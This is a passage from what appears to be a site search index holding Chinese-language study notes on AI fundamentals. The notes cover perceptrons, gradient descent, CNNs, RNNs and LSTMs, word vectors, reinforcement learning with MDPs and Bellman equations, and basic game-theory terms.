<li>\u5355\u5c42\u611f\u77e5\u673a\u6784\u5efa\u635f\u5931\u51fd\u6570\u6765\u8ba1\u7b97\u6a21\u578b\u9884\u6d4b\u503c\u4e0e\u6570\u636e\u771f\u5b9e\u503c\u4e4b\u95f4\u7684\u8bef\u5dee\uff0c\u901a\u8fc7\u4fee\u6539\u6743\u91cd\u6700\u5c0f\u5316\u635f\u5931\u51fd\u6570\u503c\uff0c\u6765\u4f18\u5316\u6a21\u578b\u53c2\u6570</li> <li>\u5355\u5c42\u611f\u77e5\u673a\u53ef\u88ab\u7528\u6765\u533a\u5206\u7ebf\u6027\u53ef\u5206\u6570\u636e</li> </ul> </li> <li>\u591a\u5c42\u611f\u77e5\u673a<ul> <li>\u7531\u8f93\u5165\u5c42\u3001\u8f93\u51fa\u5c42\u548c\u81f3\u5c11\u4e00\u5c42\u7684\u9690\u85cf\u5c42\u6784\u6210</li> <li>\u76f8\u90bb\u5c42\u4e4b\u95f4\u5168\u8fde\u63a5</li> </ul> </li> </ul> </li> <li>\u53c2\u6570\u4f18\u5316<ul> <li>\u795e\u7ecf\u7f51\u7edc\u53c2\u6570\u4f18\u5316\u662f\u4e00\u79cd\u76d1\u7763\u5b66\u4e60\u7684\u8fc7\u7a0b</li> <li>\u6a21\u578b\u4f1a\u5229\u7528\u53cd\u5411\u4f20\u64ad\u7b97\u6cd5\u5c06\u635f\u5931\u51fd\u6570\u8ba1\u7b97\u6240\u5f97\u8bef\u5dee\u4ece\u8f93\u51fa\u7aef\u51fa\u53d1\uff0c\u7531\u540e\u5411\u524d\u4f20\u9012\u7ed9\u795e\u7ecf\u7f51\u7edc\u4e2d\u7684\u6bcf\u4e2a\u5355\u5143\uff0c\u7136\u540e\u901a\u8fc7\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\u5bf9\u795e\u7ecf\u7f51\u7edc\u4e2d\u7684\u53c2\u6570\u8fdb\u884c\u66f4\u65b0</li> <li>\u68af\u5ea6\u4e0b\u964d\uff08gradient descent\uff09<ul> <li>\u6279\u91cf\u68af\u5ea6\u4e0b\u964d\uff1a\u5728\u6574\u4e2a\u8bad\u7ec3\u96c6\u4e0a\u8ba1\u7b97\u635f\u5931\u8bef\u5dee</li> <li>\u968f\u673a\u68af\u5ea6\u4e0b\u964d\uff1a\u5728\u6bcf\u4e2a\u8bad\u7ec3\u6837\u672c\u4e0a\u8ba1\u7b97\u635f\u5931\u8bef\u5dee\uff0c\u6536\u655b\u5feb\uff0c\u4f46\u53ef\u80fd\u51fa\u73b0\u76ee\u6807\u51fd\u6570\u9707\u8361\u4e0d\u7a33\u5b9a\u73b0\u8c61</li> <li>\u5c0f\u6279\u91cf\u68af\u5ea6\u4e0b\u964d\uff1a\u9009\u53d6\u8bad\u7ec3\u96c6\u4e0a\u5c0f\u6279\u91cf\u6837\u672c\u8ba1\u7b97\u635f\u5931\u8bef\u5dee\uff0c\u6700\u5e38\u7528</li> </ul> </li> <li>\u53cd\u5411\u4f20\u64ad\uff08back propagation\uff0cBP\uff09</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_23","title":"\u5377\u79ef\u795e\u7ecf\u7f51\u7edc","text":"<ul> <li>\u5377\u79ef\uff08convolution\uff09\u662f\u9488\u5bf9\u50cf\u7d20\u70b9\u7684\u7a7a\u95f4\u4f9d\u8d56\u6027\u6765\u5bf9\u56fe\u50cf\u8fdb\u884c\u5904\u7406\u7684\u4e00\u79cd\u6280\u672f</li> <li>\u5377\u79ef\u6ee4\u6ce2\u7684\u7ed3\u679c\u5728\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u4e2d\u88ab\u79f0\u4e3a\u7279\u5f81\u56fe\uff08feature map\uff09</li> <li>\u5728\u5377\u79ef\u64cd\u4f5c\u65f6\uff0c\u7ecf\u5e38\u4f1a\u91c7\u7528 padding\uff08\u586b\u5145\uff09\u548c striding\uff08\u6b65\u957f\uff09\u4e24\u79cd\u65b9\u6cd5</li> <li>\u6c60\u5316\uff08pooling\uff09<ul> <li>\u53ef\u7528\u67d0\u4e00\u533a\u57df\u5b50\u5757\u7684\u7edf\u8ba1\u4fe1\u606f\u6765\u523b\u753b\u8be5\u533a\u57df\u4e2d\u6240\u6709\u50cf\u7d20\u70b9\u5448\u73b0\u7684\u7a7a\u95f4\u5206\u5e03\u6a21\u5f0f\uff0c\u6765\u66ff\u4ee3\u533a\u57df\u5b50\u5757\u4e2d\u6240\u6709\u50cf\u7d20\u70b9\u53d6\u503c</li> <li>\u6c60\u5316\u64cd\u4f5c\u5bf9\u5377\u79ef\u7ed3\u679c\u7279\u5f81\u56fe\u8fdb\u884c\u7ea6\u51cf\uff0c\u5b9e\u73b0\u4e86\u4e0b\u91c7\u6837\uff0c\u540c\u65f6\u4fdd\u7559\u4e86\u7279\u5f81\u56fe\u4e2d\u4e3b\u8981\u4fe1\u606f</li> <li>\u6700\u5927\u6c60\u5316\u3001\u5e73\u5747\u6c60\u5316\u3001k \u6700\u5927\u6c60\u5316\uff08\u53d6\u524d k \u4e2a\u6700\u5927\u503c\uff0c\u5e38\u7528\u4e8e\u81ea\u7136\u8bed\u8a00\u5904\u7406\uff09</li> </ul> </li> <li>\u795e\u7ecf\u7f51\u7edc\u6b63\u5219\u5316<ul> <li>\u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u7ed3\u6784\u590d\u6742\u53c2\u6570\u4f17\u591a\uff0c\u5bb9\u6613\u9020\u6210\u8fc7\u62df\u5408\uff0c\u9700\u8981\u91c7\u53d6\u4e00\u4e9b\u6b63\u5219\u5316\u6280\u672f\u6765\u63d0\u5347\u795e\u7ecf\u7f51\u7edc\u6cdb\u5316\u80fd\u529b\uff08generalization\uff09</li> <li>dropout\uff1a\u968f\u673a\u4e22\u6389\u4e00\u90e8\u5206\u795e\u7ecf\u5143\u6765\u51cf\u5c11\u795e\u7ecf\u7f51\u7edc\u590d\u6742\u5ea6</li> <li>\u6279\u5f52\u4e00\u5316\uff1a\u901a\u8fc7\u89c4\u8303\u5316\u624b\u6bb5\uff0c\u628a\u795e\u7ecf\u7f51\u7edc\u6bcf\u5c42\u4e2d\u4efb\u610f\u795e\u7ecf\u5143\u7684\u8f93\u5165\u503c\u5206\u5e03\u6539\u4e3a\u6807\u51c6\u6b63\u6001\u5206\u5e03\uff0c\u628a\u504f\u79fb\u8f83\u5927\u7684\u5206\u5e03\u5f3a\u5236\u6620\u5c04\u4e3a\u6807\u51c6\u6b63\u6001\u5206\u5e03</li> <li>L1 \u548c L2 \u6b63\u5219\u5316</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_24","title":"\u5faa\u73af\u795e\u7ecf\u7f51\u7edc","text":"<ul> <li>\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\uff08recurrent neural network\uff0cRNN\uff09\u662f\u4e00\u7c7b\u5904\u7406\u5e8f\u5217\u6570\u636e\u65f6\u91c7\u7528\u7684\u7f51\u683c\u7ed3\u6784</li> <li>\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\u672c\u8d28\u662f\u6a21\u62df\u4eba\u6240\u5177\u6709\u7684\u8bb0\u5fc6\u80fd\u529b\uff0c\u5728\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u8bb0\u4f4f\u90e8\u5206\u5df2\u7ecf\u51fa\u73b0\u7684\u4fe1\u606f\uff0c\u5e76\u5229\u7528\u6240\u8bb0\u4f4f\u7684\u4fe1\u606f\u5f71\u54cd\u540e\u7eed\u8282\u70b9\u8f93\u51fa</li> <li>RNN \u5728\u81ea\u7136\u8bed\u8a00\u5904\u7406\u5982\u8bed\u97f3\u8bc6\u522b\u3001\u60c5\u611f\u5206\u6790\u3001\u673a\u5668\u7ffb\u8bd1\u7b49\u9886\u57df\u6709\u91cd\u8981\u5e94\u7528</li> <li>\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\u6a21\u578b<ul> <li>\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\u5728\u5904\u7406\u6570\u636e\u8fc7\u7a0b\u4e2d\u6784\u6210\u4e86\u4e00\u4e2a\u5faa\u73af\u4f53</li> <li>\u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\u6570\u636e\uff0c\u5728\u6bcf\u4e00\u65f6\u523b \\(t\\)\uff0c\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\u5355\u5143\u4f1a\u8bfb\u53d6\u5f53\u524d\u8f93\u5165\u6570\u636e \\(x_t\\) \u548c\u524d\u4e00\u65f6\u523b\u8f93\u5165\u6570\u636e \\(x_{t-1}\\) \u6240\u5bf9\u5e94\u7684\u9690\u5f0f\u7f16\u7801\u7ed3\u679c \\(h_{t-1}\\)\uff0c\u4e00\u8d77\u751f\u6210 \\(t\\) \u65f6\u523b\u7684\u9690\u5f0f\u7f16\u7801\u7ed3\u679c \\(h_t\\)</li> <li>\u6fc0\u6d3b\u51fd\u6570\u4e00\u822c\u53ef\u4e3a sigmoid \u6216 tanh\uff0c\u4f7f\u6a21\u578b\u80fd\u591f\u5fd8\u6389\u65e0\u5173\u4fe1\u606f\u540c\u65f6\u66f4\u65b0\u8bb0\u5fc6\u5185\u5bb9</li> <li>\u8bad\u7ec3\u65b9\u5f0f\u4e3a\u6cbf\u65f6\u95f4\u53cd\u5411\u4f20\u64ad\u7b97\u6cd5\uff08BPTT\uff09</li> <li>\u5f53\u5e8f\u5217\u8fc7\u957f\u65f6\uff0c\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\u4e5f\u5bb9\u6613\u51fa\u73b0\u68af\u5ea6\u6d88\u5931\u6216\u68af\u5ea6\u7206\u70b8\u7684\u95ee\u9898</li> </ul> </li> <li>\u957f\u77ed\u65f6\u8bb0\u5fc6\u7f51\u7edc\uff08LSTM\uff09\uff1a\u5f15\u5165\u4e86\u5185\u90e8\u8bb0\u5fc6\u5355\u5143\u548c\u95e8\u7ed3\u6784\u6765\u5bf9\u5f53\u524d\u8f93\u5165\u4fe1\u606f\u4ee5\u53ca\u524d\u5e8f\u65f6\u523b\u6240\u751f\u6210\u7684\u4fe1\u606f\u8fdb\u884c\u6574\u5408\u548c\u4f20\u9012</li> <li>\u95e8\u63a7\u5faa\u73af\u5355\u5143\uff08gated recurrent unit\uff0cGRU\uff09\uff1a\u4e00\u79cd\u5bf9 LSTM \u7b80\u5316\u7684\u6df1\u5ea6\u5b66\u4e60\u6a21\u578b<ul> <li>\u4e0d\u4f7f\u7528\u8bb0\u5fc6\u5355\u5143\u6765\u4f20\u9012\u4fe1\u606f\uff0c\u800c\u662f\u4f7f\u7528\u9690\u85cf\u72b6\u6001\u6765\u4f20\u9012\uff0c\u6709\u66f4\u9ad8\u7684\u8ba1\u7b97\u901f\u5ea6</li> <li>\u53ea\u5305\u542b\u66f4\u65b0\u95e8\u548c\u91cd\u7f6e\u95e8</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_25","title":"\u6df1\u5ea6\u5b66\u4e60\u5e94\u7528","text":"<ul> <li>\u8bcd\u5411\u91cf\u6a21\u578b<ul> <li>\u8bcd\u888b\u6a21\u578b\uff08bag of words\uff09\uff0c\u5c06\u6587\u672c\u770b\u4f5c\u662f\u4e00\u7ec4\u8bcd\u7684\u96c6\u5408\uff0c\u5ffd\u7565\u8bcd\u4e0e\u8bcd\u4e4b\u95f4\u7684\u987a\u5e8f\u5173\u7cfb</li> <li>\u5206\u5e03\u5f0f\u5411\u91cf\u8868\u8fbe\uff08distributed vector representation\uff09<ul> <li>\u5229\u7528\u6df1\u5ea6\u5b66\u4e60\u6a21\u578b\uff0c\u5c06\u6bcf\u4e2a\u5355\u8bcd\u8868\u5f81\u4e3a N \u7ef4\u5b9e\u503c\u7684\u5206\u5e03\u5f0f\u5411\u91cf</li> <li>\u8bcd\u5411\u91cf\uff08Word2Vec\uff09\u662f\u8f83\u4e3a\u7ecf\u5178\u7684\u6a21\u578b<ul> <li>\u8bad\u7ec3\u6a21\u5f0f\u6709 continuous bag-of-words\uff08CBOW\uff09\u548c skip-gram</li> </ul> </li> </ul> </li> </ul> </li> <li>\u56fe\u50cf\u5206\u7c7b\u548c\u76ee\u6807\u5b9a\u4f4d<ul> <li>\u8f93\u5165\u4e00\u5e45\u56fe\u50cf\uff0c\u9996\u5148\u5229\u7528\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u6765\u63d0\u53d6\u89c6\u89c9\u7279\u5f81\uff0c\u5f97\u5230\u4e00\u4e2a\u7279\u5f81\u5411\u91cf\u6765\u8868\u793a\u8f93\u5165\u56fe\u50cf</li> <li>\u8fd9\u4e2a\u5411\u91cf\u4f5c\u4e3a\u8f93\u5165\u7279\u5f81\u5206\u522b\u4f20\u9001\u7ed9\u4e24\u4e2a\u4efb\u52a1\uff0c\u5373\u5206\u7c7b\u4efb\u52a1\u548c\u5b9a\u4f4d\u4efb\u52a1</li> <li>\u5206\u7c7b\u4efb\u52a1\u4e2d\uff0c\u4f7f\u7528 softmax</li> <li>\u5b9a\u4f4d\u4efb\u52a1\u4e2d\uff0c\u5c06\u5411\u91cf\u8f6c\u5316\u4e3a\u4e00\u4e2a\u56db\u7ef4\u5411\u91cf\uff0c\u8868\u793a\u5b9a\u4f4d\u8fb9\u754c</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_26","title":"\u5f3a\u5316\u5b66\u4e60","text":""},{"location":"cs/ai/basic/#_27","title":"\u5f3a\u5316\u5b66\u4e60\u95ee\u9898\u5b9a\u4e49","text":"<ul> <li>\u667a\u80fd\u4f53\uff08agent\uff09\uff0c\u6839\u636e\u7ecf\u9a8c\u505a\u51fa\u5224\u65ad\u5e76\u6267\u884c\u52a8\u4f5c\uff1b\u73af\u5883\uff08environment\uff09\uff0c\u667a\u80fd\u4f53\u610f\u5916\u7684\u4e00\u5207</li> <li>\u72b6\u6001\uff08state\uff09\uff0c\u667a\u80fd\u4f53\u5bf9\u73af\u5883\u7684\u4e00\u79cd\u7406\u89e3\u548c\u7f16\u7801\uff1b\u52a8\u4f5c\uff08action\uff09\uff1b\u7b56\u7565\uff08policy\uff09\uff0c\u5f53\u524d\u72b6\u6001\u6267\u884c\u67d0\u4e2a\u52a8\u4f5c\u7684\u4f9d\u636e\uff1b\u5956\u52b1\uff08reaward\uff09</li> <li>\u4e0e\u76d1\u7763\u5b66\u4e60\u548c\u65e0\u76d1\u7763\u5b66\u4e60\u76f8\u6bd4\uff0c\u5f3a\u5316\u5b66\u4e60\u57fa\u4e8e\u8bc4\u4f30\uff0c\u6570\u636e\u6765\u6e90\u4e8e\u65f6\u5e8f\u4ea4\u4e92\uff0c\u51b3\u7b56\u8fc7\u7a0b\u662f\u5e8f\u8d2f\u51b3\u7b56\uff0c\u76ee\u6807\u662f\u9009\u62e9\u80fd\u591f\u83b7\u53d6\u6700\u5927\u6536\u76ca\u7684\u72b6\u6001\u5230\u52a8\u4f5c\u7684\u6620\u5c04</li> <li>\u9a6c\u5c14\u53ef\u592b\u51b3\u7b56\u8fc7\u7a0b<ul> <li>\u9a6c\u5c14\u53ef\u592b\u6027\uff08Markov property\uff09\uff1a\u4e0b\u4e00\u523b\u7684\u72b6\u6001 \\(X_{t+1}\\) \u53ea\u7531\u5f53\u524d\u72b6\u6001 \\(X_t\\) \u51b3\u5b9a\uff0c\u4e0e\u66f4\u65e9\u7684\u6240\u6709\u72b6\u6001\u5747\u65e0\u5173</li> <li>\u6ee1\u8db3\u9a6c\u5c14\u53ef\u592b\u6027\u7684\u79bb\u6563\u968f\u673a\u8fc7\u7a0b\u88ab\u79f0\u4e3a\u9a6c\u5c14\u53ef\u592b\u94fe\uff08Markov chain\uff09</li> <li>\u5b9a\u4e49\u79bb\u6563\u9a6c\u5c14\u53ef\u592b\u8fc7\u7a0b \\(\\{S_t\\}_{t=0, 1, \\cdots}\\)\uff0c\u53ef\u4ee5\u5b9a\u4e49\u72b6\u6001\u8f6c\u79fb\u6982\u7387 \\(P(S_{t+1}|S_t,A_t)\\)\uff0c\u5176\u4e2d \\(A_t\\) \u4e3a\u5728\u72b6\u6001 \\(S_t\\) \u4e0b\u6267\u884c\u7684\u52a8\u4f5c</li> <li>\u5b9a\u4e49\u5956\u52b1\u51fd\u6570 \\(R_{t+1}=R(S_t, A_t, S_{t+1})\\) \u63cf\u8ff0\u4ece\u7b2c \\(t\\) \u6b65\u72b6\u6001\u8f6c\u79fb\u91c7\u53d6\u52a8\u4f5c \\(A_t\\) \u5230\u7b2c \\(t+1\\) \u6b65\u72b6\u6001\u7684\u5956\u52b1</li> <li>\u5728\u6bcf\u4e2a\u65f6\u523b\u5b9a\u4e49\u56de\u62a5\uff08return\uff09\u6765\u53cd\u6620\u8be5\u65f6\u523b\u53ef\u5f97\u5230\u7684\u7d2f\u52a0\u5956\u52b1 \\(G_t=R_{t+1}+\\gamma R_{t+2}+\\gamma^2R_{t+3}+\\cdots\\)\uff0c\u5176\u4e2d \\(\\gamma\\) \u79f0\u4e3a\u6298\u6263\u56e0\u5b50</li> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u521d\u59cb\u72b6\u6001\u548c\u7ec8\u6b62\u72b6\u6001\u5e76\u4e0d\u5305\u62ec\u5728\u9a6c\u5c14\u53ef\u592b\u51b3\u7b56\u8fc7\u7a0b\u5b9a\u4e49\u4e2d<ul> <li>\u53ef\u4ee5\u6dfb\u52a0\u865a\u62df\u7684\u521d\u59cb\u72b6\u6001\u548c\u7ec8\u6b62\u72b6\u6001\uff0c\u865a\u62df\u521d\u59cb\u72b6\u6001\u4ee5\u4e00\u5b9a\u6982\u7387\u8f6c\u79fb\u5230\u771f\u6b63\u521d\u59cb\u72b6\u6001\uff0c\u771f\u6b63\u7ec8\u6b62\u72b6\u6001\u4ee5\u6982\u7387 1 \u8f6c\u79fb\u5230\u865a\u62df\u7ec8\u6b62\u72b6\u6001</li> </ul> </li> <li>\u667a\u80fd\u4f53\u9010\u6b65\u91c7\u53d6\u884c\u52a8\uff0c\u53ef\u5f97\u5230\u4e00\u4e2a\u72b6\u6001\u5e8f\u5217 \\((S_0, S_1, \\cdots)\\) \u79f0\u4e3a\u8f68\u8ff9\uff08trajectory\uff09\uff0c\u8f68\u8ff9\u957f\u5ea6\u53ef\u4ee5\u662f\u65e0\u9650\u7684\uff0c\u4e5f\u53ef\u4ee5\u6709\u7ec8\u6b62\u72b6\u6001 \\(S_T\\)<ul> <li>\u5305\u542b\u7ec8\u6b62\u72b6\u6001\u7684\u95ee\u9898\u53eb\u5206\u6bb5\uff08episodic\uff09\u95ee\u9898\uff0c\u6b64\u65f6\u4ece\u521d\u59cb\u72b6\u6001\u5230\u7ec8\u6b62\u72b6\u6001\u7684\u5b8c\u6574\u8f68\u8ff9\u79f0\u4e3a\u4e00\u4e2a\u7247\u6bb5\uff08episode\uff09</li> <li>\u4e0d\u5305\u542b\u7ec8\u6b62\u72b6\u6001\u7684\u95ee\u9898\u53eb\u6301\u7eed\uff08continuing\uff09\u95ee\u9898</li> </ul> </li> </ul> </li> <li>\u5f3a\u5316\u5b66\u4e60\u95ee\u9898\u5b9a\u4e49<ul> <li>\u667a\u80fd\u4f53\u9009\u62e9\u52a8\u4f5c\u7684\u6a21\u578b\u5373\u7b56\u7565\u51fd\u6570\uff0c\\(\\pi(s, a)\\) \u8868\u793a\u5728\u72b6\u6001 \\(s\\) \u4e0b\u91c7\u53d6\u52a8\u4f5c \\(a\\) \u7684\u6982\u7387<ul> <li>\u4e00\u4e2a\u597d\u7684\u7b56\u7565\u51fd\u6570\u5e94\u8be5\u80fd\u591f\u4f7f\u667a\u80fd\u4f53\u5728\u91c7\u53d6\u4e86\u4e00\u7cfb\u5217\u884c\u52a8\u4e4b\u540e\u53ef\u5f97\u5230\u6700\u4f73\u5956\u52b1</li> </ul> </li> <li>\u4ef7\u503c\u51fd\u6570\uff08value function\uff09\uff0c\\(V_\\pi(s)=\\mathbb{E}_\\pi[G_t|S_t=s]\\) \u8868\u793a\u667a\u80fd\u4f53\u5728\u65f6\u523b \\(t\\) \u65f6\u5904\u4e8e\u72b6\u6001 \\(s\\) \u65f6\uff0c\u6309\u7167\u7b56\u7565 \\(\\pi\\) \u91c7\u53d6\u884c\u52a8\u65f6\u6240\u5f97\u5230\u7684\u56de\u62a5\u7684\u671f\u671b</li> <li>\u52a8\u4f5c-\u4ef7\u503c\u51fd\u6570\uff0c\\(q_\\pi(s, a)=\\mathbb{E}_\\pi[G_t|S_t=s, A_t=a]\\)</li> <li>\u5f3a\u5316\u5b66\u4e60\u53ef\u4ee5\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7b56\u7565\u5b66\u4e60\u95ee\u9898\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u9a6c\u5c14\u53ef\u592b\u51b3\u7b56\u8fc7\u7a0b \\(MDP=(S, A, P, R, \\gamma)\\)\uff0c\u5b66\u4e60\u4e00\u4e2a\u6700\u4f18\u7b56\u7565 \\(\\pi^*\\)\uff0c\u5bf9\u4efb\u610f \\(s\\in S\\) \u4f7f\u5f97 \\(V_{\\pi^*}(s)\\) \u503c\u6700\u5927</li> </ul> </li> <li>\u8d1d\u5c14\u66fc\u65b9\u7a0b\uff08Bellman equation\uff09/\u52a8\u6001\u89c4\u5212\u65b9\u7a0b\uff08dynamic programming equation\uff09<ul> <li>\\(V_\\pi(s)=\\sum_{a\\in A}\\pi(s, a)q_\\pi(s, a)\\)\uff0c\u53ef\u7528\u52a8\u4f5c-\u4ef7\u503c\u51fd\u6570\u6765\u8868\u8fbe\u4ef7\u503c\u51fd\u6570<ul> <li>\u72b6\u6001 \\(s\\) \u7684\u4ef7\u503c\u53ef\u7528\u8be5\u72b6\u6001\u4e0b\u53ef\u91c7\u53d6\u6240\u6709\u52a8\u4f5c\u800c\u53d6\u5f97\u7684\u671f\u671b\u4ef7\u503c\u6765\u8868\u8ff0</li> </ul> </li> <li>\\(q_pi(s, a) = \\sum_{s'\\in S}P(s'|s, a)[R(s, a, s')+\\gamma V_\\pi(s')]\\)\uff0c\u53ef\u7528\u4ef7\u503c\u51fd\u6570\u6765\u8868\u793a\u52a8\u4f5c-\u4ef7\u503c\u51fd\u6570<ul> <li>\u5728\u67d0\u4e2a\u72b6\u6001\u4e0b\u6267\u884c\u67d0\u4e00\u4e2a\u52a8\u4f5c\u6240\u5f97\u7684\u4ef7\u503c\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u8be5\u52a8\u4f5c\u4e4b\u540e\u8fdb\u5165\u7684\u6240\u6709\u72b6\u6001\u83b7\u5f97\u7684\u77ac\u65f6\u5956\u52b1\u548c\u540e\u7eed\u72b6\u6001\u53ef\u53d6\u5f97\u4ef7\u503c\u7684\u671f\u671b\u6765\u8868\u793a</li> </ul> </li> <li>\u4ef7\u503c\u51fd\u6570\u8d1d\u5c14\u66fc\u65b9\u7a0b\uff1a\\(V_\\pi(s)=\\mathbb{E}_{a\\sim \\pi(s, \\cdot)}\\mathbb{E}_{s'\\sim P(\\cdot | s, a)}[R(s, a, s'), \\gamma V_pi(s')]\\)<ul> <li>\u4ef7\u503c\u51fd\u6570\u53d6\u503c\u548c\u65f6\u95f4\u6ca1\u6709\u5173\u7cfb\uff0c\u53ea\u4e0e\u7b56\u7565 \\(\\pi\\)\u3001\u5728\u7b56\u7565 \\(\\pi\\) \u4e0b\u4ece\u67d0\u4e2a\u72b6\u6001\u8f6c\u79fb\u5230\u540e\u7eed\u72b6\u6001\u6240\u53d6\u5f97\u7684\u56de\u62a5\u4ee5\u53ca\u5728\u540e\u7eed\u6240\u5f97\u56de\u62a5\u6709\u5173</li> <li>\\(V_\\pi\\) \u7531\u4e24\u4e2a\u90e8\u5206\u6784\u6210\uff1a\u6267\u884c\u5f53\u524d\u52a8\u4f5c\u6240\u5f97\u5230\u7684\u77ac\u65f6\u5956\u52b1\uff0c\u5728\u540e\u7eed\u72b6\u6001\u6240\u80fd\u5f97\u5230\u7684\u56de\u62a5\u7684\u671f\u671b\u7684\u6298\u6263\u503c</li> </ul> </li> <li>\u8d1d\u5c14\u66fc\u65b9\u7a0b\u63cf\u8ff0\u4e86\u4ef7\u503c\u51fd\u6570\u6216\u52a8\u4f5c-\u4ef7\u503c\u51fd\u6570\u7684\u9012\u63a8\u5173\u7cfb\uff0c\u662f\u7814\u7a76\u5f3a\u5316\u5b66\u4e60\u95ee\u9898\u7684\u91cd\u8981\u624b\u6bb5</li> <li>\u6c42\u89e3\u6700\u4f18\u7b56\u7565\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u6c42\u89e3\u6700\u4f18\u7684\u4ef7\u503c\u51fd\u6570\u6216\u6700\u4f18\u7684\u52a8\u4f5c-\u4ef7\u503c\u51fd\u6570\uff0c\u5373\u57fa\u4e8e\u4ef7\u503c\u65b9\u6cd5\uff08value-based approach\uff09</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_28","title":"\u57fa\u4e8e\u4ef7\u503c\u7684\u5f3a\u5316\u5b66\u4e60","text":"<ul> <li>\u4e00\u79cd\u6c42\u89e3\u6700\u4f18\u7b56\u7565\u7684\u601d\u8def\uff1a\u4ece\u4e00\u4e2a\u4efb\u610f\u7684\u7b56\u7565\u5f00\u59cb\uff0c\u9996\u5148\u8ba1\u7b97\u8be5\u7b56\u7565\u4e0b\u4ef7\u503c\u51fd\u6570\uff0c\u7136\u540e\u6839\u636e\u4ef7\u503c\u51fd\u6570\u8c03\u6574\u6539\u8fdb\u7b56\u7565\u4f7f\u5176\u66f4\u4f18\uff0c\u4e0d\u65ad\u8fed\u4ee3\u76f4\u5230\u7b56\u7565\u6536\u655b<ul> <li>\u901a\u8fc7\u7b56\u7565\u8ba1\u7b97\u4ef7\u503c\u51fd\u6570\u7684\u8fc7\u7a0b\u79f0\u4e3a\u7b56\u7565\u8bc4\u4f30\uff08policy evaluation\uff09</li> <li>\u901a\u8fc7\u4ef7\u503c\u4f18\u5316\u7b56\u7565\u7684\u8fc7\u7a0b\u53eb\u505a\u7b56\u7565\u4f18\u5316\uff08policy improvement\uff09</li> <li>\u7b56\u7565\u8bc4\u4f30\u548c\u7b56\u7565\u4f18\u5316\u4ea4\u66ff\u8fdb\u884c\u7684\u5f3a\u5316\u5b66\u4e60\u6c42\u89e3\u65b9\u6cd5\u53eb\u505a\u901a\u7528\u7b56\u7565\u8fed\u4ee3\uff08GPI\uff09</li> <li>\u51e0\u4e4e\u6240\u6709\u5f3a\u5316\u5b66\u4e60\u65b9\u6cd5\u90fd\u53ef\u4ee5\u4f7f\u7528 GPI \u6765\u89e3\u91ca</li> </ul> </li> <li>\u7b56\u7565\u4f18\u5316\u5b9a\u7406<ul> <li>\u5047\u8bbe\u5f53\u524d\u7b56\u7565\u4e3a \\(\\pi\\)\uff0c\u5bf9\u5e94\u7684\u4ef7\u503c\u51fd\u6570\u548c\u52a8\u4f5c-\u4ef7\u503c\u51fd\u6570\u4e3a \\(V_\\pi, q_\\pi\\)\uff0c\u5219\u53ef\u4ee5\u6784\u9020\u7b56\u7565 \\(\\pi'(s)=\\argmax_aq_\\pi(s, a)\\)\uff0c\u6b64\u65f6 \\(\\pi'\\) \u4e0d\u6bd4 \\(\\pi\\) \u5dee</li> <li>\u7ed9\u5b9a\u7b56\u7565\u3001\u4ef7\u503c\u51fd\u6570\u548c\u52a8\u4f5c-\u4ef7\u503c\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u8be5\u5f0f\u8ba1\u7b97\u5f97\u5230\u66f4\u597d\u6216\u540c\u7b49\u7684\u7b56\u7565</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_29","title":"\u4eba\u5de5\u667a\u80fd\u535a\u5f08","text":""},{"location":"cs/ai/basic/#_30","title":"\u535a\u5f08\u8bba\u57fa\u7840\u6982\u5ff5","text":"<ul> <li>\u53c2\u4e0e\u535a\u5f08\u7684\u51b3\u7b56\u4e3b\u4f53\u88ab\u79f0\u4e3a\u73a9\u5bb6\u6216\u53c2\u4e0e\u8005\uff08player\uff09\uff0c\u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u5b8c\u5168\u7406\u6027\u7684</li> <li>\u5728\u535a\u5f08\u4e2d\u53c2\u4e0e\u8005\u80fd\u83b7\u5f97\u7684\u4e0e\u535a\u5f08\u76f8\u5173\u7684\u77e5\u8bc6\u79f0\u4e3a\u4fe1\u606f\uff08information\uff09</li> <li>\u535a\u5f08\u9700\u8981\u9075\u5faa\u4e00\u5b9a\u7684\u89c4\u5219\uff08rule\uff09</li> <li>\u53c2\u4e0e\u8005\u53ef\u4ee5\u91c7\u53d6\u7684\u884c\u52a8\u65b9\u6848\u79f0\u4e3a\u7b56\u7565\uff08strategy\uff09<ul> <li>\u7b56\u7565\u5fc5\u987b\u662f\u4e00\u6574\u5957\u5728\u91c7\u53d6\u884c\u52a8\u4e4b\u524d\u5c31\u5df2\u7ecf\u51c6\u5907\u597d\u7684\u5b8c\u6574\u65b9\u6848</li> <li>\u4e00\u4e2a\u53c2\u4e0e\u8005\u80fd\u91c7\u7eb3\u7b56\u7565\u7684\u5168\u4f53\u7ec4\u5408\u5f62\u6210\u5176\u6240\u62e5\u6709\u7684\u7b56\u7565\u96c6\uff08strategy set\uff09</li> <li>\u53c2\u4e0e\u8005\u4e5f\u53ef\u4ee5\u6309\u7167\u4e00\u5b9a\u6982\u7387\u968f\u673a\u9009\u62e9\u82e5\u5e72\u4e0d\u540c\u884c\u52a8\uff0c\u79f0\u4e3a\u6df7\u5408\u7b56\u7565\uff08mixed strategy\uff09\uff0c\u53cd\u4e4b\u79f0\u4e3a\u7eaf\u7b56\u7565\uff08pure strategy\uff09</li> </ul> </li> 